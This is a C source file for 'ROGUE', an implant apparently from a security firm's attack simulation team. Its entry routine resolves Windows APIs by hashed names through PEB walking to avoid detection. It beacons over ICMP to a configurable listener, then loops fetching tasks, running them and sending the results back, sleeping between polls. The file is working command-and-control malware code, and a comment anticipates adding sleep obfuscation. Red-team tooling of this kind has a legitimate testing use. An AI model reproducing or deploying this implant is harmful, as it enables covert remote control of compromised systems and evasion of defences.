/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
{
	UINT32	TaskCode;
	UINT32	TaskId;
	UINT32	Length;
	UCHAR	Buffer[0];
} CMD_REQUEST_HDR, *PCMD_REQUEST_HDR ;

typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
{
	UINT32	TaskId;
	UINT32	ReturnCode;
	UINT32	ErrorValue;
	UCHAR	Buffer[0];
} CMD_RETURN_HDR, *PCMD_RETURN_HDR ;

typedef struct
{
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Starts tasking back to Navi, executes the
 * task, sends the result, and then goes to
 * sleep.
 *
!*/
D_SEC( B ) VOID WINAPI Entry( VOID )
{
	API		Api;
	CMD_REQUEST_HDR	Req;
	CMD_RETURN_HDR	Ret;

	BOOL		Res = FALSE;
	BOOL		Rcv = FALSE;
	PBUFFER		Inb = NULL;
	PBUFFER		Onb = NULL;
	PROGUE_CTX	Ctx = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Req, sizeof( Req ) );
	RtlSecureZeroMemory( &Ret, sizeof( Ret ) );

	Api.RtlAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Create a buffer to hold the rogue context */
	if ( ( Ctx = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( ROGUE_CTX ) ) ) != NULL ) {

		/* Create a random integer constant */
		RandomString( Ctx->Id, sizeof( Ctx->Id ) );

		/* Create initial output buffer */
		if ( ( Onb = BufferCreate() ) != NULL ) {

			/* Append the starting ID */
			if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {

				/* Append response task header */
				if ( BufferAddRaw( Onb, &Ret, sizeof( Ret ) ) ) {

					/* Execute "Hello" */
					if ( TaskHello( NULL, 0, Onb ) ) {
						/* Change the IP to be configurable */
						Ctx->Established = IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
					};
				};
			};

			/* Cleanup */
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb->Buffer );
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb );
			Onb = NULL;
		};

		/* First hello sent and established */
		if ( Ctx->Established != FALSE ) {
			/* Start tasking loop. Finish once disconnected */
			for ( ; Ctx->Established != FALSE ; ) {
				/* Create an input command buffer */
				if ( ( Inb = BufferCreate( ) ) != NULL ) {
					/* Read in the incoming buffer */
					if ( IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx->Id, sizeof( Ctx->Id ), &Inb->Buffer, &Inb->Length, &Rcv ) ) {
						if ( Rcv != FALSE && Inb->Buffer != NULL && Inb->Length != 0 ) {
							if ( Inb->Length >= sizeof( CMD_REQUEST_HDR ) ) {

								/* Prepare the stack structures */
								RtlSecureZeroMemory( &Req, sizeof( Req ) );
								RtlSecureZeroMemory( &Ret, sizeof( Ret ) );

								/* Copy over the request */
								__builtin_memcpy( &Req, Inb->Buffer, sizeof( Req ) );

								/* Create an output buffer */
								if ( ( Onb = BufferCreate() ) != NULL ) {
									switch ( Req.TaskCode ) {
										case 0:
											/* Command: COMMAND_HELLO */
											if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {
												/* Set Information about the task */
												Ret.TaskId     = Req.TaskId;
												Ret.ErrorValue = NtCurrentTeb()->LastErrorValue;
												Ret.ReturnCode = FALSE;

												/* Append information about the task */
												if ( BufferAddRaw( Onb, &Ret, sizeof( Ret ) ) ) {
													PCMD_RETURN_HDR		Bf1 = NULL;
													PCMD_REQUEST_HDR	Bf2 = NULL;

													/* Set pointers */
													Bf2 = C_PTR( Inb->Buffer );
													Bf1 = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );

													/* Set return error value */
													Bf1->ReturnCode = TaskHello( Bf2->Buffer, Bf2->Length, Onb );
													Bf1->ErrorValue = NtCurrentTeb()->LastErrorValue;

													/* Dispatch the response */
													IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
												};
											};
											break;
									};

									/* Cleanup */
									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb->Buffer );
									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb );

									/* Reset variables */
									Onb = NULL;
								};
							};
						};
					};

					/* Cleanup */
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb->Buffer );
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );

					/* Reset variables */
					Inb = NULL; Rcv = FALSE;
				};
				/* ah shit!: insert obfuscate/sleep call here */
				( ( __typeof__( Sleep ) * ) PeGetFuncEat( PebGetModule( 0x6ddb9555 ), 0xe07cd7e ) )( 20000 );
			};
		};

		/* Cleanup */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ctx );
		Ctx = NULL;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Req, sizeof( Req ) );
	RtlSecureZeroMemory( &Ret, sizeof( Ret ) );
};
